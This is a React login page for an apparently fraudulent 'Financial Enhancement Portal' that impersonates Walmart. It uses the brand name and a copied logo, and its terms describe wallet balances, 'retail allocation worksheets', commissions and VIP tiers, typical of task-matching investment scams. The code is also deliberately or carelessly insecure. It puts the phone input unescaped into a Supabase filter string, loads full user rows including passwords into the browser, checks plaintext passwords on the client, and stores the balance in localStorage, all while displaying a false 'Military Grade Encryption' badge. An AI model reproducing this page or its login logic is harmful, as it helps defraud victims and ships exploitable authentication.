import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../supabase';
import LanguageSwitcher from '../components/LanguageSwitcher';
import loginBg from '@/login.png';
import { 
  Phone, 
  Lock, 
  ChevronDown, 
  Search, 
  CheckCircle2, 
  ArrowRight,
  ShieldCheck,
  Globe
} from 'lucide-react';
import { Button, Modal, Input } from '@/src/shared/UI';
import toast from 'react-hot-toast';

const COUNTRIES = [
  { code: '+213', flagCode: 'dz', name: 'Algeria' },
  { code: '+54', flagCode: 'ar', name: 'Argentina' },
  { code: '+61', flagCode: 'au', name: 'Australia' },
  { code: '+43', flagCode: 'at', name: 'Austria' },
  { code: '+973', flagCode: 'bh', name: 'Bahrain' },
  { code: '+880', flagCode: 'bd', name: 'Bangladesh' },
  { code: '+32', flagCode: 'be', name: 'Belgium' },
  { code: '+591', flagCode: 'bo', name: 'Bolivia' },
  { code: '+55', flagCode: 'br', name: 'Brazil' },
  { code: '+673', flagCode: 'bn', name: 'Brunei' },
  { code: '+855', flagCode: 'kh', name: 'Cambodia' },
  { code: '+56', flagCode: 'cl', name: 'Chile' },
  { code: '+86', flagCode: 'cn', name: 'China' },
  { code: '+57', flagCode: 'co', name: 'Colombia' },
  { code: '+53', flagCode: 'cu', name: 'Cuba' },
  { code: '+420', flagCode: 'cz', name: 'Czech Republic' },
  { code: '+45', flagCode: 'dk', name: 'Denmark' },
  { code: '+1', flagCode: 'do', name: 'Dominican Republic' },
  { code: '+593', flagCode: 'ec', name: 'Ecuador' },
  { code: '+20', flagCode: 'eg', name: 'Egypt' },
  { code: '+358', flagCode: 'fi', name: 'Finland' },
  { code: '+33', flagCode: 'fr', name: 'France' },
  { code: '+49', flagCode: 'de', name: 'Germany' },
  { code: '+30', flagCode: 'gr', name: 'Greece' },
  { code: '+502', flagCode: 'gt', name: 'Guatemala' },
  { code: '+504', flagCode: 'hn', name: 'Honduras' },
  { code: '+852', flagCode: 'hk', name: 'Hong Kong' },
  { code: '+36', flagCode: 'hu', name: 'Hungary' },
  { code: '+91', flagCode: 'in', name: 'India' },
  { code: '+62', flagCode: 'id', name: 'Indonesia' },
  { code: '+964', flagCode: 'iq', name: 'Iraq' },
  { code: '+353', flagCode: 'ie', name: 'Ireland' },
  { code: '+972', flagCode: 'il', name: 'Israel' },
  { code: '+39', flagCode: 'it', name: 'Italy' },
  { code: '+81', flagCode: 'jp', name: 'Japan' },
  { code: '+7', flagCode: 'kz', name: 'Kazakhstan' },
  { code: '+254', flagCode: 'ke', name: 'Kenya' },
  { code: '+82', flagCode: 'kr', name: 'Korea' },
  { code: '+965', flagCode: 'kw', name: 'Kuwait' },
  { code: '+856', flagCode: 'la', name: 'Laos' },
  { code: '+853', flagCode: 'mo', name: 'Macao' },
  { code: '+60', flagCode: 'my', name: 'Malaysia' },
  { code: '+52', flagCode: 'mx', name: 'Mexico' },
  { code: '+212', flagCode: 'ma', name: 'Morocco' },
  { code: '+95', flagCode: 'mm', name: 'Myanmar' },
  { code: '+977', flagCode: 'np', name: 'Nepal' },
  { code: '+31', flagCode: 'nl', name: 'Netherlands' },
  { code: '+64', flagCode: 'nz', name: 'New Zealand' },
  { code: '+505', flagCode: 'ni', name: 'Nicaragua' },
  { code: '+234', flagCode: 'ng', name: 'Nigeria' },
  { code: '+47', flagCode: 'no', name: 'Norway' },
  { code: '+968', flagCode: 'om', name: 'Oman' },
  { code: '+92', flagCode: 'pk', name: 'Pakistan' },
  { code: '+507', flagCode: 'pa', name: 'Panama' },
  { code: '+595', flagCode: 'py', name: 'Paraguay' },
  { code: '+51', flagCode: 'pe', name: 'Peru' },
  { code: '+63', flagCode: 'ph', name: 'Philippines' },
  { code: '+48', flagCode: 'pl', name: 'Poland' },
  { code: '+351', flagCode: 'pt', name: 'Portugal' },
  { code: '+974', flagCode: 'qa', name: 'Qatar' },
  { code: '+40', flagCode: 'ro', name: 'Romania' },
  { code: '+7', flagCode: 'ru', name: 'Russia' },
  { code: '+966', flagCode: 'sa', name: 'Saudi Arabia' },
  { code: '+65', flagCode: 'sg', name: 'Singapore' },
  { code: '+421', flagCode: 'sk', name: 'Slovakia' },
  { code: '+27', flagCode: 'za', name: 'South Africa' },
  { code: '+34', flagCode: 'es', name: 'Spain' },
  { code: '+94', flagCode: 'lk', name: 'Sri Lanka' },
  { code: '+46', flagCode: 'se', name: 'Sweden' },
  { code: '+41', flagCode: 'ch', name: 'Switzerland' },
  { code: '+886', flagCode: 'tw', name: 'Taiwan' },
  { code: '+66', flagCode: 'th', name: 'Thailand' },
  { code: '+216', flagCode: 'tn', name: 'Tunisia' },
  { code: '+90', flagCode: 'tr', name: 'Turkey' },
  { code: '+971', flagCode: 'ae', name: 'UAE' },
  { code: '+44', flagCode: 'gb', name: 'UK' },
  { code: '+380', flagCode: 'ua', name: 'Ukraine' },
  { code: '+598', flagCode: 'uy', name: 'Uruguay' },
  { code: '+1', flagCode: 'us', name: 'USA/Canada' },
  { code: '+998', flagCode: 'uz', name: 'Uzbekistan' },
  { code: '+58', flagCode: 've', name: 'Venezuela' },
  { code: '+84', flagCode: 'vn', name: 'Vietnam' }
];

export default function Login() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [agreeTerms, setAgreeTerms] = useState(true);
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showPoliciesModal, setShowPoliciesModal] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Country selector
  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES.find(c => c.code === '+1' && c.flagCode === 'us') || COUNTRIES[0]);
  const [countryDropdownOpen, setCountryDropdownOpen] = useState(false);
  const [countrySearchQuery, setCountrySearchQuery] = useState('');
  const countryDropdownRef = useRef<HTMLDivElement>(null);

  const filteredCountries = COUNTRIES.filter(c => 
    c.name.toLowerCase().includes(countrySearchQuery.toLowerCase().trim()) || 
    c.code.includes(countrySearchQuery.trim())
  );

  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (countryDropdownRef.current && !countryDropdownRef.current.contains(event.target as Node)) {
        setCountryDropdownOpen(false);
      }
    }
    function handleKeyDown(event: KeyboardEvent) {
      if (event.key === 'Escape') {
        setCountryDropdownOpen(false);
      }
    }
    document.addEventListener('mousedown', handleClickOutside);
    document.addEventListener('keydown', handleKeyDown);
    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!agreeTerms) {
      toast.error("Please agree to terms and policies");
      return;
    }
    if (!phone || !password) {
      toast.error("Fill all fields");
      return;
    }

    setIsLoading(true);
    try {
      const rawPhone = phone.trim();
      const cleanedDigits = rawPhone.replace(/^[+]/, '');
      const fullPhone = `${selectedCountry.code}${cleanedDigits}`;
      const fullPhoneWithSpace = `${selectedCountry.code} ${cleanedDigits}`;

      const queryFilter = `username.eq.${fullPhone},phone.eq.${fullPhone},username.eq.${fullPhoneWithSpace},phone.eq.${fullPhoneWithSpace},username.eq.${rawPhone},phone.eq.${rawPhone}`;

      const { data: users, error } = await supabase.from('cb_users').select('*').or(queryFilter);
      if (error) throw error;

      const user = users && users[0];
      if (user) {
        if (user.password && user.password !== password) {
          toast.error("Invalid password");
          return;
        }

        await supabase.from('cb_users').update({ online: 'Online' }).eq('id', user.id);
        
        localStorage.setItem('cb_username', user.username);
        localStorage.setItem('cb_balance', user.balance.toString());
        localStorage.setItem('cb_user_session', JSON.stringify({
          id: user.id,
          username: user.username,
          referredBy: user.referred_by_staff_id || 'None'
        }));
        window.dispatchEvent(new Event('cb_session_updated'));
        toast.success(`Welcome back, ${user.username}`);
        navigate('/home');
      } else {
        toast.error("Account not found");
      }
    } catch (err: any) {
      toast.error("Sign in failed: " + err.message);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen relative flex items-center justify-center p-4 overflow-hidden bg-slate-950">
      {/* Dynamic Background */}
      <div className="absolute inset-0 z-0">
        <img src={loginBg} alt="bg" className="w-full h-full object-cover opacity-40 scale-110 blur-sm" />
        <div className="absolute inset-0 bg-gradient-to-tr from-slate-950 via-slate-900/90 to-blue-900/30" />
      </div>

      {/* Floating Orbs */}
      <div className="absolute top-1/4 left-10 w-64 h-64 bg-blue-600/20 rounded-full blur-[100px] animate-pulse-slow" />
      <div className="absolute bottom-1/4 right-10 w-64 h-64 bg-indigo-600/20 rounded-full blur-[100px] animate-pulse-slow delay-1000" />

      {/* Language Corner */}
      <div className="fixed top-4 right-4 sm:top-6 sm:right-6 z-50 flex items-center gap-2 bg-slate-900/80 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/15 shadow-xl text-white">
        <Globe className="w-4 h-4 text-sky-400 shrink-0" />
        <LanguageSwitcher />
      </div>

      <div className="relative z-10 w-full max-w-md my-8 animate-in fade-in zoom-in-95 duration-700">
        {/* Brand Header */}
        <div className="text-center mb-8 space-y-3 pt-8 sm:pt-2">
          <div className="inline-flex items-center gap-2.5 px-5 py-2.5 bg-slate-900/90 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/15">
            <span className="font-extrabold text-2xl text-sky-400 tracking-tight italic">Walmart</span>
            <span className="flex items-center">
              <svg viewBox="0 0 100 100" width="20" height="20" className="shrink-0">
                <g transform="translate(50,50)" stroke="#FFC220" strokeWidth="15" strokeLinecap="round">
                  <line x1="0" y1="-10" x2="0" y2="-38" />
                  <line x1="0" y1="-10" x2="0" y2="-38" transform="rotate(60)" />
                  <line x1="0" y1="-10" x2="0" y2="-38" transform="rotate(120)" />
                  <line x1="0" y1="-10" x2="0" y2="-38" transform="rotate(180)" />
                  <line x1="0" y1="-10" x2="0" y2="-38" transform="rotate(240)" />
                  <line x1="0" y1="-10" x2="0" y2="-38" transform="rotate(300)" />
                </g>
              </svg>
            </span>
            <div className="w-px h-5 bg-white/20 ml-1" />
            <ShieldCheck className="w-5 h-5 text-amber-400" />
          </div>
          <p className="text-[10px] font-black text-sky-400 uppercase tracking-[0.3em]">Financial Enhancement Portal</p>
        </div>

        {/* Login Card */}
        <div className="glass-dark border border-white/10 rounded-[32px] p-8 shadow-2xl backdrop-blur-2xl">
          <form onSubmit={handleLogin} className="space-y-6">
            <div className="text-center space-y-1 mb-8">
              <h2 className="text-xl font-black text-white tracking-tight">Merchant Access</h2>
              <p className="text-xs font-bold text-slate-500 uppercase tracking-widest">Sign in to your matching node</p>
            </div>

            {/* Phone Input */}
            <div className={`space-y-2 relative ${countryDropdownOpen ? 'z-50' : 'z-10'}`}>
              <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest pl-1 flex items-center gap-2">
                <Phone className="w-3 h-3" />
                Mobile Connection
              </label>
              <div className="flex h-14 bg-white/5 border border-white/10 rounded-2xl relative focus-within:ring-2 focus-within:ring-blue-500/20 focus-within:border-blue-500/50 transition-all">
                <div className="relative shrink-0 h-full" ref={countryDropdownRef}>
                  <button 
                    type="button"
                    onClick={() => setCountryDropdownOpen(prev => !prev)}
                    aria-expanded={countryDropdownOpen}
                    className="h-full px-3.5 flex items-center gap-2 bg-white/5 border-r border-white/10 hover:bg-white/10 active:bg-white/15 transition-colors rounded-l-2xl cursor-pointer"
                  >
                    <img 
                      src={`https://flagcdn.com/w40/${selectedCountry.flagCode}.png`} 
                      className="w-5 h-3.5 object-cover rounded-sm shadow-sm shrink-0" 
                      alt="" 
                      referrerPolicy="no-referrer"
                    />
                    <span className="text-sm font-black text-white">{selectedCountry.code}</span>
                    <ChevronDown className={`w-3.5 h-3.5 text-slate-400 transition-transform duration-200 ${countryDropdownOpen ? 'rotate-180 text-blue-400' : ''}`} />
                  </button>

                  {countryDropdownOpen && (
                    <div className="absolute top-full left-0 mt-2 w-72 sm:w-80 bg-slate-900/98 backdrop-blur-2xl border border-white/15 rounded-2xl shadow-2xl overflow-hidden z-[100] ring-1 ring-black/50 animate-in fade-in zoom-in-95 duration-150">
                      <div className="p-2.5 border-b border-white/10 flex items-center gap-2 bg-white/5">
                        <Search className="w-4 h-4 text-slate-400 shrink-0" />
                        <input 
                          type="text" 
                          autoFocus
                          placeholder="Search countries or code..." 
                          className="bg-transparent border-none text-sm text-white placeholder-slate-400 w-full outline-none py-1"
                          value={countrySearchQuery}
                          onChange={e => setCountrySearchQuery(e.target.value)}
                        />
                        {countrySearchQuery && (
                          <button
                            type="button"
                            onClick={() => setCountrySearchQuery('')}
                            className="text-xs text-slate-400 hover:text-white px-1.5 py-0.5 rounded cursor-pointer"
                          >
                            ✕
                          </button>
                        )}
                      </div>
                      <div className="max-h-64 overflow-y-auto p-1.5 space-y-0.5 custom-scrollbar overscroll-contain">
                        {filteredCountries.length > 0 ? (
                          filteredCountries.map(c => {
                            const isSelected = selectedCountry.code === c.code && selectedCountry.flagCode === c.flagCode;
                            return (
                              <button
                                key={`${c.flagCode}-${c.code}`}
                                type="button"
                                onClick={() => { 
                                  setSelectedCountry(c); 
                                  setCountryDropdownOpen(false); 
                                  setCountrySearchQuery('');
                                }}
                                className={`w-full flex items-center gap-3 px-3 py-2.5 rounded-xl transition-colors text-left cursor-pointer ${
                                  isSelected 
                                    ? 'bg-blue-600/30 text-white border border-blue-500/40 font-bold' 
                                    : 'hover:bg-white/10 text-slate-300'
                                }`}
                              >
                                <img 
                                  src={`https://flagcdn.com/w40/${c.flagCode}.png`} 
                                  className="w-5 h-3.5 object-cover rounded-sm shadow-sm shrink-0" 
                                  alt="" 
                                  referrerPolicy="no-referrer"
                                />
                                <span className="flex-1 text-xs font-semibold truncate">{c.name}</span>
                                <span className={`text-xs font-mono font-bold shrink-0 ${isSelected ? 'text-blue-300' : 'text-blue-400'}`}>
                                  {c.code}
                                </span>
                              </button>
                            );
                          })
                        ) : (
                          <div className="py-6 px-3 text-center text-xs text-slate-400">
                            No countries found matching "{countrySearchQuery}"
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
                <input 
                  type="tel" 
                  placeholder="Phone number" 
                  className="flex-1 bg-transparent px-4 text-sm font-bold text-white outline-none rounded-r-2xl min-w-0"
                  value={phone}
                  onChange={e => setPhone(e.target.value)}
                  required
                />
              </div>
            </div>

            {/* Password Input */}
            <div className="space-y-2">
              <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest pl-1 flex items-center gap-2">
                <Lock className="w-3 h-3" />
                Secure Key
              </label>
              <input 
                type="password" 
                placeholder="••••••••" 
                className="w-full h-14 bg-white/5 border border-white/10 rounded-2xl px-4 text-sm font-bold text-white outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500/50 transition-all"
                value={password}
                onChange={e => setPassword(e.target.value)}
                required
              />
            </div>

            {/* Terms Checkbox */}
            <div className="flex items-start gap-3 p-1">
              <div className="relative flex items-center">
                <input 
                  type="checkbox" 
                  id="agreeTerms"
                  checked={agreeTerms} 
                  onChange={e => setAgreeTerms(e.target.checked)}
                  className="w-5 h-5 rounded-lg border-2 border-white/10 bg-white/5 checked:bg-blue-600 checked:border-blue-600 transition-all cursor-pointer appearance-none"
                />
                <CheckCircle2 className={`absolute w-3 h-3 text-white pointer-events-none left-1 transition-opacity ${agreeTerms ? 'opacity-100' : 'opacity-0'}`} />
              </div>
              <label htmlFor="agreeTerms" className="text-[11px] text-slate-500 leading-relaxed font-medium">
                I accept the <button type="button" onClick={() => setShowTermsModal(true)} className="text-blue-500 font-black underline">Service Terms</button> and <button type="button" onClick={() => setShowPoliciesModal(true)} className="text-blue-500 font-black underline">Merchant Policies</button>.
              </label>
            </div>

            <Button type="submit" className="w-full h-14 text-base group" isLoading={isLoading}>
              <span>Initialize Session</span>
              <ArrowRight className="w-5 h-5 ml-2 group-hover:translate-x-1 transition-transform" />
            </Button>

            <p className="text-center text-xs font-bold text-slate-600 uppercase tracking-widest pt-4">
              New Merchant? <button type="button" onClick={() => navigate('/register')} className="text-blue-500 hover:underline">Create Account</button>
            </p>
          </form>
        </div>

        {/* Trust Badge */}
        <div className="mt-12 flex items-center justify-center gap-8 opacity-40 grayscale group hover:grayscale-0 transition-all">
          <div className="flex items-center gap-2">
            <div className="w-8 h-px bg-slate-800" />
            <p className="text-[9px] font-black text-slate-500 uppercase tracking-[0.4em]">Military Grade Encryption</p>
            <div className="w-8 h-px bg-slate-800" />
          </div>
        </div>
      </div>

      {/* Modals */}
      <Modal isOpen={showTermsModal} onClose={() => setShowTermsModal(false)} title="Terms of Service">
        <div className="space-y-6 text-sm text-slate-400">
          <p>By registering an account with Walmart, you represent that you are at least 18 years of age and agree to comply with all operational terms.</p>
          <p>Users are responsible for maintaining the confidentiality of their passwords and secure keys. Sharing accounts or manipulaing slips is strictly prohibited.</p>
          <Button onClick={() => setShowTermsModal(false)} className="w-full">Agree & Close</Button>
        </div>
      </Modal>

      <Modal isOpen={showPoliciesModal} onClose={() => setShowPoliciesModal(false)} title="Operational Policies">
        <div className="space-y-6 text-sm text-slate-400">
          <p>Walmart utilizes a real-time smart matching algorithm. Users must maintain a positive wallet balance to match and accept retail allocation worksheets.</p>
          <p>Commissions are credited immediately upon successful verification. Standard daily limits apply based on VIP tier.</p>
          <Button onClick={() => setShowPoliciesModal(false)} className="w-full">I Understand</Button>
        </div>
      </Modal>
    </div>
  );
}
